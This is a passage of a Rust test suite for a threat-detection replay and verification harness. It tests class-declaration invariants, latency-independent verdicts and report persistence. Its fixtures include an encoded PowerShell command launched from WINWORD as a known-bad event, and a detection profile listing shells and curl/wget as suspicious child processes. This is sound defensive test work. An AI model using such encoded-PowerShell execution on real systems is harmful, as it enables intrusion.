                subject_of_a_failed_invariant,
                "verification failed, but not because of `{scenario_name}`; the scenario was still skipped by every invariant: {:#?}",
                lookup.report.invariants
            );
        }
    }
}

const UNCLASSIFIED_SCENARIO_BODY: &str = r#"
input:
  kind: events
  events:
    - action:
        type: escalate
        summary: operator review
        urgency: MEDIUM
      event:
        source: synthetic
        event_id: hunt-unclassified-1
        timestamp: 1700000000600
        host_id: host-unclassified
        payload:
          kind: process_start
          parent_process: launchd
          process_name: ls
          command_line: ls -la
          user: alice

expectations:
  replay_bundle_count: 0
  investigation_count: 0
  incident_count: 0
  max_detect_latency_us: 5000
  max_policy_latency_us: 5000
  max_response_latency_us: 5000
"#;

/// A replay scenario manifest that declares no `class:` must not pass a
/// verification vacuously.
///
/// `ReplayScenarioClass` defaulted to `Mixed`, and `Mixed` satisfied NEITHER
/// safety invariant: `verify_known_bad_coverage` demands a detection only from
/// `Adversarial` scenarios, and `verify_false_positive_bound` draws
/// counterexamples only from `Benign` ones. A scenario that omitted the field
/// was therefore exempt from BOTH invariants at once and contributed to
/// neither -- and the verification report still recorded `passed: true`. That
/// is a signed evidence artifact attesting to a check that never executed.
///
/// The scenario below emits no detection, so it would FAIL
/// `known_bad_coverage` were it adversarial. A fix may refuse the manifest or
/// subject it to an invariant. What it may not do is return `passed: true`
/// having looked at it through neither.
#[tokio::test]
async fn verification_does_not_pass_vacuously_on_a_scenario_that_declares_no_class() {
    let yaml = format!(
        r#"name: unclassified_scenario
description: Scenario manifest that declares no class
seed_time_ms: 1700000600000
requested_by: replay-whisker
receipt_chain: []
metadata:
  tags:
    - unclassified
{UNCLASSIFIED_SCENARIO_BODY}"#
    );
    let (root, outcome) = verification_over_extra_scenario_yaml(
        "verification-absent-class",
        "unclassified-scenario.yaml",
        &yaml,
    )
    .await;

    assert_scenario_was_not_silently_exempt(outcome, "unclassified_scenario", "unclassified");

    let _ = fs::remove_dir_all(root);
}

/// The same vacuity, reached by declaring the class explicitly rather than by
/// omitting it. Making the field mandatory closes the omission path but leaves
/// this one wide open -- and `harvested_solver_counterexample_scenario` in the
/// evolution lane writes `class: mixed` today. An unclassified scenario is a
/// weak input however it is spelled, so it must fail closed here too.
#[tokio::test]
async fn verification_does_not_pass_vacuously_on_a_scenario_that_declares_class_mixed() {
    let yaml = format!(
        r#"name: mixed_scenario
description: Scenario manifest that declares the mixed class
seed_time_ms: 1700000700000
requested_by: replay-whisker
receipt_chain: []
metadata:
  class: mixed
  tags:
    - unclassified
{UNCLASSIFIED_SCENARIO_BODY}"#
    );
    let (root, outcome) = verification_over_extra_scenario_yaml(
        "verification-mixed-class",
        "mixed-scenario.yaml",
        &yaml,
    )
    .await;

    assert_scenario_was_not_silently_exempt(outcome, "mixed_scenario", "mixed-scenario");

    let _ = fs::remove_dir_all(root);
}

/// Pins the SHAPE of the refusal for an absent `class:`. It is a
/// deserialization failure at load, before the scenario can enter any corpus:
/// `class` carries no `#[serde(default)]` and `ReplayScenarioClass` carries no
/// `Default`, so serde has nothing to fall back on and says which field is
/// missing.
#[test]
fn scenario_manifest_that_omits_class_is_refused_at_load() {
    let root = unique_temp_dir("scenario-missing-class");
    let path = root.join("unclassified-scenario.yaml");
    fs::write(
        &path,
        format!(
            r#"name: unclassified_scenario
description: Scenario manifest that declares no class
seed_time_ms: 1700000600000
requested_by: replay-whisker
receipt_chain: []
metadata:
  tags:
    - unclassified
{UNCLASSIFIED_SCENARIO_BODY}"#
        ),
    )
    .unwrap();

    let error = load_scenario_manifest(&path).unwrap_err().to_string();
    assert!(
        error.contains("missing field `class`"),
        "refusal must name the missing field, got: {error}"
    );

    let _ = fs::remove_dir_all(root);
}

/// Pins the SHAPE of the refusal for an explicit `class: mixed`. Serde cannot
/// catch that one -- the value is well formed -- so a named gating invariant
/// does, and it records the offending scenario as its own counterexample. The
/// alternative considered was making `Mixed` subject to both existing
/// invariants; that also fails closed, but it fails through two contradictory
/// messages ("expected at least one detection" AND "produced a detection on a
/// benign control"), so the evidence bundle would misdescribe the reason.
#[tokio::test]
async fn verification_reports_a_mixed_class_scenario_under_scenario_class_declared() {
    let yaml = format!(
        r#"name: mixed_scenario
description: Scenario manifest that declares the mixed class
seed_time_ms: 1700000700000
requested_by: replay-whisker
receipt_chain: []
metadata:
  class: mixed
  tags:
    - unclassified
{UNCLASSIFIED_SCENARIO_BODY}"#
    );
    let (root, outcome) = verification_over_extra_scenario_yaml(
        "verification-mixed-class-named",
        "mixed-scenario.yaml",
        &yaml,
    )
    .await;
    let report = outcome.unwrap().report;

    assert!(!report.passed);
    let invariant = report
        .invariants
        .iter()
        .find(|invariant| invariant.name == "scenario_class_declared")
        .expect("verification must carry a scenario_class_declared invariant");
    assert!(!invariant.passed);
    assert_eq!(invariant.actual, serde_json::json!(1));
    assert_eq!(
        invariant
            .counterexamples
            .iter()
            .map(|counterexample| counterexample.subject.as_str())
            .collect::<Vec<_>>(),
        vec!["mixed_scenario"]
    );
    // Every OTHER invariant is green, which is the point: nothing else in the
    // corpus is wrong, and without this invariant the report would say passed.
    assert!(
        report
            .invariants
            .iter()
            .filter(|invariant| invariant.name != "scenario_class_declared")
            .all(|invariant| invariant.passed)
    );

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn shadow_report_persists_for_control_candidate() {
    let root = unique_temp_dir("shadow-report");
    let results_dir = root.join("results");
    let shadows_dir = root.join("shadow-results");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    let experiments_src_dir = root.join("experiments");
    let verification_src_dir = root.join("verifications");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();
    fs::create_dir_all(&experiments_src_dir).unwrap();
    fs::create_dir_all(&verification_src_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );
    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );
    let verification_path = write_verification(
        &verification_src_dir,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(&format!(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: {}
benign_controls:
  scenarios:
    - {}
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.05
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
            suite_path.display(),
            benign_path.display(),
        ))
        .unwrap(),
    );
    let experiment_path = write_experiment(
        &experiments_src_dir,
        "office-baseline-control.yaml",
        &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
            r#"
name: office_baseline_control
description: control candidate
corpus:
  suite: {}
verification:
  corpus: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: office_baseline_control
  description: candidate matches baseline
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: control
  rationale: preserve baseline behavior
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 10000
"#,
            suite_path.display(),
            verification_path.display(),
        ))
        .unwrap(),
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let lookup = harness
        .evaluate_shadow_path(&experiment_path, &shadows_dir)
        .await
        .unwrap();

    assert!(lookup.report.passed);
    assert_eq!(
        lookup.report.comparison.delta.false_positive_rate_delta,
        0.0
    );
    assert!(render_shadow_report(&lookup.report).contains("Shadow Evaluation"));
    let reloaded = harness
        .load_shadow(&shadows_dir, &lookup.record.shadow_id)
        .unwrap()
        .unwrap();
    assert_eq!(reloaded.record.shadow_id, lookup.record.shadow_id);

    let _ = fs::remove_dir_all(root);
}

#[tokio::test]
async fn promotion_review_packet_persists_and_reloads() {
    let root = unique_temp_dir("promotion-review");
    let results_dir = root.join("results");
    let verifications_dir = root.join("verification-results");
    let shadows_dir = root.join("shadow-results");
    let reviews_dir = root.join("promotion-reviews");
    let scenarios_dir = root.join("scenarios");
    let suites_dir = root.join("scenario-suites");
    let experiments_src_dir = root.join("experiments");
    let verification_src_dir = root.join("verifications");
    fs::create_dir_all(&scenarios_dir).unwrap();
    fs::create_dir_all(&suites_dir).unwrap();
    fs::create_dir_all(&experiments_src_dir).unwrap();
    fs::create_dir_all(&verification_src_dir).unwrap();

    let office_path = write_scenario(
        &scenarios_dir,
        "office-dropper-correlation.yaml",
        &scenario_manifest(),
    );
    let benign_path = write_scenario(
        &scenarios_dir,
        "python-maintenance-benign.yaml",
        &python_benign_manifest(),
    );
    let suite_path = write_suite(
        &suites_dir,
        "hellcat-office-v1.yaml",
        &ReplaySuiteManifest {
            name: "hellcat_office_v1".to_string(),
            description: "Hellcat office corpus".to_string(),
            corpus_version: "test-1".to_string(),
            metadata: Default::default(),
            scenarios: vec![
                office_path.display().to_string(),
                benign_path.display().to_string(),
            ],
        },
    );
    let verification_path = write_verification(
        &verification_src_dir,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(&format!(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: {}
benign_controls:
  scenarios:
    - {}
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.05
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
            suite_path.display(),
            benign_path.display(),
        ))
        .unwrap(),
    );
    let experiment_path = write_experiment(
        &experiments_src_dir,
        "office-baseline-control.yaml",
        &serde_yaml::from_str::<DetectorExperimentManifest>(&format!(
            r#"
name: office_baseline_control
description: control candidate
corpus:
  suite: {}
verification:
  corpus: {}
candidate:
  strategy: suspicious_process_tree
  strategy_id: office_baseline_control
  description: candidate matches baseline
  profile:
    suspicious_parents:
      - winword
      - excel
      - outlook
      - acrord32
      - teams
    suspicious_children:
      - powershell
      - pwsh
      - cmd
      - sh
      - bash
      - curl
      - wget
    high_confidence_threshold: 0.9
    medium_confidence_threshold: 0.7
lineage:
  parent_strategy_id: suspicious_process_tree
  mutation: control
  rationale: preserve baseline behavior
gates:
  require_known_bad_coverage: true
  max_false_positive_delta: 0
  max_detect_latency_delta_us: 10000
"#,
            suite_path.display(),
            verification_path.display(),
        ))
        .unwrap(),
    );

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();
    let verification = harness
        .evaluate_verification_path(&experiment_path, &verifications_dir)
        .await
        .unwrap();
    let shadow = harness
        .evaluate_shadow_path(&experiment_path, &shadows_dir)
        .await
        .unwrap();
    let review = harness
        .create_promotion_review_packet(
            &experiment_path,
            &verifications_dir,
            &verification.record.verification_id,
            &shadows_dir,
            &shadow.record.shadow_id,
            &reviews_dir,
        )
        .unwrap();

    assert_eq!(
        review.packet.recommendation,
        PromotionReviewRecommendation::ReadyForManualReview
    );
    assert!(review.packet.blocking_reasons.is_empty());
    assert!(render_promotion_review_packet(&review.packet).contains("Promotion Review Packet"));

    let reloaded = harness
        .load_promotion_review(&reviews_dir, &review.record.review_id)
        .unwrap()
        .unwrap();
    assert_eq!(reloaded.record.review_id, review.record.review_id);

    let _ = fs::remove_dir_all(root);
}

#[test]
fn verification_corpus_manifest_loads_and_validates() {
    let root = unique_temp_dir("verification-corpus");
    let corpus_path = write_verification(
        &root,
        "office-detector-safety-v1.yaml",
        &serde_yaml::from_str::<VerificationCorpusManifest>(
            r#"
name: office_detector_safety_v1
description: safety corpus
known_bad:
  suite: ../scenario-suites/hellcat-office-v1.yaml
benign_controls:
  scenarios:
    - ../scenarios/benign-baseline.yaml
canonical_templates:
  - name: office_encoded_powershell_execution
    threat_class: execution
    event:
      source: verification-template
      event_id: tpl-execution-1
      timestamp: 1700000300000
      host_id: template-host-1
      payload:
        kind: process_start
        parent_process: WINWORD
        process_name: powershell
        command_line: powershell -enc SQBFAFgA
        user: alice
resource_budgets:
  max_false_positive_rate: 0.05
  max_detect_latency_us: 10000
  max_total_detections: 8
"#,
        )
        .unwrap(),
    );

    let manifest = load_verification_manifest(&corpus_path).unwrap();
    assert_eq!(manifest.name, "office_detector_safety_v1");
    assert_eq!(manifest.benign_controls.scenarios.len(), 1);
    assert_eq!(manifest.canonical_templates.len(), 1);
    assert_eq!(manifest.resource_budgets.max_false_positive_rate, 0.05);
    assert_eq!(manifest.resource_budgets.max_detect_latency_us, 10000);

    let _ = fs::remove_dir_all(root);
}

#[test]
fn replay_scenario_manifest_round_trips_through_yaml() {
    let manifest = scenario_manifest();
    let encoded = serde_yaml::to_string(&manifest).unwrap();
    let decoded: ReplayScenarioManifest = serde_yaml::from_str(&encoded).unwrap();

    assert_eq!(decoded.name, manifest.name);
    assert_eq!(decoded.description, manifest.description);
    assert_eq!(decoded.metadata, manifest.metadata);
    assert_eq!(decoded.expectations, manifest.expectations);
}

#[test]
fn replay_suite_manifest_round_trips_through_yaml() {
    let manifest = ReplaySuiteManifest {
        name: "office_suite".to_string(),
        description: "office replay suite".to_string(),
        corpus_version: "v1".to_string(),
        metadata: ReplaySuiteMetadata {
            campaign: Some("hellcat.office_loader".to_string()),
            techniques: vec!["T1204.002".to_string()],
            tags: vec!["office".to_string()],
        },
        scenarios: vec![
            "scenarios/office-dropper.yaml".to_string(),
            "scenarios/office-benign.yaml".to_string(),
        ],
    };

    let encoded = serde_yaml::to_string(&manifest).unwrap();
    let decoded: ReplaySuiteManifest = serde_yaml::from_str(&encoded).unwrap();
    assert_eq!(decoded.name, "office_suite");
    assert_eq!(decoded.metadata, manifest.metadata);
    assert_eq!(decoded.scenarios.len(), 2);
}

fn repo_root() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .and_then(|path| path.parent())
        .unwrap()
        .to_path_buf()
}

fn office_control_experiment() -> PathBuf {
    repo_root().join("experiments/office-baseline-control.yaml")
}

/// Canonical digest over the VERDICT-BEARING fields of a verification report:
/// the overall `passed` flag, every invariant's name and `passed` flag, and
/// every counterexample. Deliberately excludes `expected`/`actual`/`details`,
/// which is where the latency measurement is recorded -- the digest has to be
/// blind to the observation and sensitive to the verdict.
fn verdict_digest(report: &super::DetectorVerificationReport) -> (String, String) {
    use sha2::{Digest, Sha256};

    let canonical = serde_json::json!({
        "passed": report.passed,
        "invariants": report
            .invariants
            .iter()
            .map(|invariant| {
                serde_json::json!({
                    "name": invariant.name,
                    "passed": invariant.passed,
                    "counterexamples": invariant
                        .counterexamples
                        .iter()
                        .map(|counterexample| {
                            serde_json::json!({
                                "subject": counterexample.subject,
                                "reference": counterexample.reference,
                                "details": counterexample.details,
                            })
                        })
                        .collect::<Vec<_>>(),
                })
            })
            .collect::<Vec<_>>(),
    });
    let canonical_text = serde_json::to_string(&canonical).unwrap();
    let digest = hex::encode(Sha256::digest(canonical_text.as_bytes()));
    (digest, canonical_text)
}

/// Every detect-latency measurement the report records, wherever it lives.
/// Shape-tolerant on purpose: the fix may move the observation out of the
/// invariant list, but it must keep recording it somewhere.
fn recorded_detect_latencies(value: &Value, out: &mut Vec<u64>) {
    match value {
        Value::Object(map) => {
            if let Some(Value::String(name)) = map.get("name")
                && name.contains("detect_latency")
            {
                for key in [
                    "actual",
                    "observed",
                    "observed_us",
                    "value",
                    "worst_case_us",
                    "max_detect_latency_us",
                ] {
                    if let Some(number) = map.get(key).and_then(Value::as_u64) {
                        out.push(number);
                    }
                }
            }
            for (key, child) in map {
                if (key.contains("detect_latency") || key.contains("latency_us"))
                    && let Some(number) = child.as_u64()
                {
                    out.push(number);
                }
                recorded_detect_latencies(child, out);
            }
        }
        Value::Array(items) => {
            for item in items {
                recorded_detect_latencies(item, out);
            }
        }
        _ => {}
    }
}

fn latency_observations(report: &super::DetectorVerificationReport) -> Vec<u64> {
    let mut observations = Vec::new();
    recorded_detect_latencies(&serde_json::to_value(report).unwrap(), &mut observations);
    observations.sort_unstable();
    observations
}

/// Same machine, same process, same inputs, two runs -- the second one with the
/// detect stage deliberately stalled far past the corpus latency budget.
///
/// The verdict a verification report reaches must be a function of the fixture
/// content, not of how busy the machine was while it was measured. So:
///   (1) the digest of the verdict-bearing fields must be byte-identical, and
///   (2) the recorded latency observation must differ, proving the load
///       differential really landed and that the report still carries the
///       signal. Without (2) this test could pass by measuring nothing at all.
#[tokio::test]
async fn verification_verdict_is_invariant_under_detect_stage_load() {
    let root = unique_temp_dir("verification-load-differential");
    let results_dir = root.join("results");
    let nominal_dir = root.join("verification-results-nominal");
    let stalled_dir = root.join("verification-results-stalled");

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

    // Pass 1: nominal. Also warms every cache the second pass will reuse, so any
    // difference the second pass shows is attributable to the injected stall.
    let nominal = harness
        .evaluate_verification_path(office_control_experiment(), &nominal_dir)
        .await
        .unwrap()
        .report;

    // Pass 2: identical inputs, one detect-stage evaluation stalled by 20ms.
    // The corpus budget is 10_000us, so this measurement blows through it while
    // staying under the 50_000us per-scenario replay expectations, which keeps
    // the differential confined to the verification-level latency invariant.
    let stalled = {
        let _stall =
            super::detect_stall::DetectStallGuard::arm(1, std::time::Duration::from_millis(20));
        harness
            .evaluate_verification_path(office_control_experiment(), &stalled_dir)
            .await
            .unwrap()
            .report
    };

    // (2) Vacuity check first: prove the load differential actually landed and
    // that latency is still a recorded signal in both reports.
    let nominal_latencies = latency_observations(&nominal);
    let stalled_latencies = latency_observations(&stalled);
    assert!(
        !nominal_latencies.is_empty() && !stalled_latencies.is_empty(),
        "report must still RECORD a detect-latency observation; \
         nominal={nominal_latencies:?} stalled={stalled_latencies:?}"
    );
    assert!(
        stalled_latencies.iter().copied().max().unwrap_or(0) > 10_000,
        "stalled run must measure past the 10_000us corpus budget, got {stalled_latencies:?}"
    );
    assert_ne!(
        nominal_latencies, stalled_latencies,
        "the two runs must differ in the measured latency observation, \
         otherwise this test proves nothing about the verdict"
    );

    // (1) The verdict must be identical across the two runs.
    let (nominal_digest, nominal_canonical) = verdict_digest(&nominal);
    let (stalled_digest, stalled_canonical) = verdict_digest(&stalled);
    assert_eq!(
        nominal_digest, stalled_digest,
        "verdict digest changed with machine load.\n  nominal: {nominal_canonical}\n  stalled: {stalled_canonical}"
    );

    let _ = fs::remove_dir_all(root);
}

/// Canonical digest over the VERDICT-BEARING fields of an experiment report:
/// the overall `passed` flag, every gate's name and `passed` flag, and every
/// regression the comparison found. Deliberately excludes
/// `expected`/`actual`/`details` and every raw metric, which is where the
/// latency measurement is recorded -- the digest has to be blind to the
/// observation and sensitive to the verdict.
fn experiment_verdict_digest(report: &super::StrategyExperimentReport) -> (String, String) {
    use sha2::{Digest, Sha256};

    let canonical = serde_json::json!({
        "passed": report.passed,
        "gates": report
            .gates
            .iter()
            .map(|gate| {
                serde_json::json!({
                    "name": gate.name,
                    "passed": gate.passed,
                })
            })
            .collect::<Vec<_>>(),
        "scenario_regressions": report
            .comparison
            .scenario_regressions
            .iter()
            .map(|regression| {
                serde_json::json!({
                    "scenario_name": regression.scenario_name,
                    "scenario_path": regression.scenario_path,
                    "reason": regression.reason,
                })
            })
            .collect::<Vec<_>>(),
        "technique_regressions": report
            .comparison
            .technique_regressions
            .iter()
            .map(|regression| {
                serde_json::json!({
                    "technique": regression.technique,
                    "scenarios": regression.scenarios,
                })
            })
            .collect::<Vec<_>>(),
    });
    let canonical_text = serde_json::to_string(&canonical).unwrap();
    let digest = hex::encode(Sha256::digest(canonical_text.as_bytes()));
    (digest, canonical_text)
}

/// Every candidate-minus-baseline detect-latency delta the report carries,
/// wherever it lives. Shape-tolerant on purpose, because its only job is to
/// prove the injected load differential MEASURABLY landed -- it is satisfied by
/// `comparison.delta.max_detect_latency_delta_us` alone and therefore pins
/// nothing about where the delta is recorded. The recording contract lives in
/// `experiment_records_detect_latency_delta_as_a_non_gating_observation`.
fn recorded_latency_deltas(value: &Value, out: &mut Vec<i64>) {
    match value {
        Value::Object(map) => {
            if let Some(Value::String(name)) = map.get("name")
                && name.contains("detect_latency_delta")
            {
                for key in ["actual", "observed", "observed_us", "value", "delta_us"] {
                    if let Some(number) = map.get(key).and_then(Value::as_i64) {
                        out.push(number);
                    }
                }
            }
            for (key, child) in map {
                if key.contains("detect_latency_delta")
                    && let Some(number) = child.as_i64()
                {
                    out.push(number);
                }
                recorded_latency_deltas(child, out);
            }
        }
        Value::Array(items) => {
            for item in items {
                recorded_latency_deltas(item, out);
            }
        }
        _ => {}
    }
}

fn latency_delta_observations(report: &super::StrategyExperimentReport) -> Vec<i64> {
    let mut observations = Vec::new();
    recorded_latency_deltas(&serde_json::to_value(report).unwrap(), &mut observations);
    observations.sort_unstable();
    observations
}

/// Same machine, same process, same fixtures, two runs -- the second one with
/// the CANDIDATE detect stage stalled and the baseline left alone.
///
/// The differential matters. An experiment gate compares candidate latency
/// against baseline latency, so a uniform slowdown cancels out and proves
/// nothing; only a one-sided stall moves the delta. That is exactly what a
/// noisy neighbour, a cold cache, or an unlucky scheduler slice does to
/// whichever suite happens to run second.
///
/// The verdict an experiment report reaches must be a function of the fixture
/// content, not of how busy the machine was while the candidate suite ran. So:
///   (1) the digest of the verdict-bearing fields must be byte-identical, and
///   (2) the measured latency delta must differ, proving the differential
///       really landed. Without (2) this test could pass by measuring nothing
///       at all. (2) says nothing about WHERE the delta is recorded; that is
///       `experiment_records_detect_latency_delta_as_a_non_gating_observation`.
#[tokio::test]
async fn experiment_verdict_is_invariant_under_candidate_detect_stage_load() {
    let root = unique_temp_dir("experiment-load-differential");
    let results_dir = root.join("results");
    let nominal_dir = root.join("experiment-results-nominal");
    let stalled_dir = root.join("experiment-results-stalled");

    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), &results_dir).unwrap();

    // Pass 1: nominal. Also warms every cache the second pass will reuse, so any
    // difference the second pass shows is attributable to the injected stall.
    let nominal = harness
        .evaluate_experiment_path(office_control_experiment(), &nominal_dir)
        .await
        .unwrap()
        .report;
    assert!(
        nominal.passed,
        "the control experiment must pass nominally, otherwise this test is not \
         measuring what a load differential does to a passing verdict: {:?}",
        nominal.gates
    );

    // Pass 2: identical inputs, one CANDIDATE detect-stage evaluation stalled by
    // 20ms. The baseline suite runs first and untouched, so the candidate-minus-
    // baseline delta blows through the manifest's 10_000us budget while staying
    // under the scenarios' own 50_000us expectations, which keeps the
    // differential confined to the experiment-level latency comparison.
    let stalled = {
        let _stall = super::detect_stall::DetectStallGuard::arm_for_strategy(
            "office_baseline_control",
            1,
            std::time::Duration::from_millis(20),
        );
        harness
            .evaluate_experiment_path(office_control_experiment(), &stalled_dir)
            .await
            .unwrap()
            .report
    };

    // (2) Vacuity check first: prove the load differential actually landed as a
    // measurable difference. Deliberately NOT a claim that the observation
    // survives -- see the helper's note.
    let nominal_deltas = latency_delta_observations(&nominal);
    let stalled_deltas = latency_delta_observations(&stalled);
    assert!(
        !nominal_deltas.is_empty() && !stalled_deltas.is_empty(),
        "both runs must measure a detect-latency delta, otherwise the differential \
         cannot be shown to have landed; nominal={nominal_deltas:?} stalled={stalled_deltas:?}"
    );
    assert!(
        stalled_deltas.iter().copied().max().unwrap_or(0) > 10_000,
        "stalled run must measure a delta past the manifest's 10_000us budget, \
         got {stalled_deltas:?}"
    );
    assert_ne!(
        nominal_deltas, stalled_deltas,
        "the two runs must differ in the measured latency delta, otherwise this \
         test proves nothing about the verdict"
    );

    // (1) The verdict must be identical across the two runs.
    let (nominal_digest, nominal_canonical) = experiment_verdict_digest(&nominal);
    let (stalled_digest, stalled_canonical) = experiment_verdict_digest(&stalled);
    assert_eq!(
        nominal_digest, stalled_digest,
        "experiment verdict digest changed with a candidate-side load differential.\n  \
         nominal: {nominal_canonical}\n  stalled: {stalled_canonical}"
    );

    let _ = fs::remove_dir_all(root);
}

/// The demotion must not decay into a deletion.
///
/// `experiment_verdict_is_invariant_under_candidate_detect_stage_load` pins the
/// VERDICT, not the RECORD. Its delta scan is shape-tolerant by design, so it is
/// already satisfied by `comparison.delta.max_detect_latency_delta_us` -- a field
/// that predates the demotion. Empty `observations` and that test stays green.
/// This one pins the record itself, on both artifacts a downstream consumer
/// actually reads: the experiment report, and the shadow report `canary.rs`
/// loads before it admits a candidate.
///
/// We lose a gate, not the signal. The measurement, the advisory budget it was
/// compared against, and the comparison's outcome must all survive as recorded
/// non-gating facts -- in the persisted artifact and in the operator-facing
/// render, at the exact place the failure used to appear.
#[tokio::test]
async fn experiment_records_detect_latency_delta_as_a_non_gating_observation() {
    let root = unique_temp_dir("experiment-latency-observation");
    let harness =
        DefaultReplayHarness::from_config("inline", sample_config(), root.join("results")).unwrap();

    // Read the budget out of the manifest rather than hard-coding it: the point
    // is that the manifest key is still being READ, not that it holds some
    // particular number.
    let manifest = load_detector_experiment_manifest(office_control_experiment()).unwrap();
    let advisory_budget = manifest.gates.advisory_max_detect_latency_delta_us;

    let (experiment, shadow) = harness
        .evaluate_experiment_and_shadow_path(
            office_control_experiment(),
            root.join("experiments"),
            root.join("shadows"),
        )
        .await
        .unwrap();

    // The gate list is the verdict input. Latency must not be back in it.
    let gate_names = experiment
        .report
        .gates
        .iter()
        .map(|gate| gate.name.clone())
        .collect::<Vec<_>>();
    assert!(
        !gate_names
            .iter()
            .any(|name| name.contains("detect_latency")),
        "no wall-clock latency comparison may sit in the GATING gate list, got {gate_names:?}"
    );

    let delta = experiment
        .report
        .comparison
        .delta
        .max_detect_latency_delta_us;
    let within_budget = delta <= advisory_budget as i64;

    for (artifact, observations) in [
        ("experiment report", &experiment.report.observations),
        ("shadow report", &shadow.report.observations),
    ] {
        let observation = observations
            .iter()
            .find(|observation| observation.name == "max_detect_latency_delta_us")
            .unwrap_or_else(|| {
                panic!(
                    "the {artifact} must still RECORD the candidate-minus-baseline \
                     detect-latency delta as a non-gating observation; \
                     observations={observations:?}"
                )
            });
        assert_eq!(
            observation.observed,
            serde_json::json!(delta),
            "the {artifact} observation must carry the delta the comparison measured"
        );
        assert_eq!(
            observation.advisory_budget,
            serde_json::json!(advisory_budget),
            "the {artifact} observation must echo back the manifest's \
             gates.max_detect_latency_delta_us as its advisory budget"
        );
        assert_eq!(
            observation.within_advisory_budget, within_budget,
            "the {artifact} budget comparison must survive as a recorded fact"
        );
    }

    // Same measurement on both artifacts: the shadow is what canary admission
    // reads, so a signal that only reaches the experiment report is not enough.
    assert_eq!(
        shadow.report.comparison.delta.max_detect_latency_delta_us, delta,
        "the shadow report must carry the same measured delta as its experiment"
    );

    let observation_line = format!(
        "- max_detect_latency_delta_us | observed={delta} \
         advisory_budget={advisory_budget} within={within_budget} |"
    );
    for (artifact, rendered) in [
        (
            "experiment report",
            render_experiment_report(&experiment.report),
        ),
        ("shadow report", render_shadow_report(&shadow.report)),
    ] {
        assert!(
            rendered.contains("Observations (non-gating, not part of Status):"),
            "the rendered {artifact} must keep the non-gating observation block:\n{rendered}"
        );
        assert!(
            rendered.contains(&observation_line),
            "the rendered {artifact} must show the measured delta next to the advisory \
             budget; expected a line starting {observation_line:?}, got:\n{rendered}"
        );
    }

    let _ = fs::remove_dir_all(root);
}
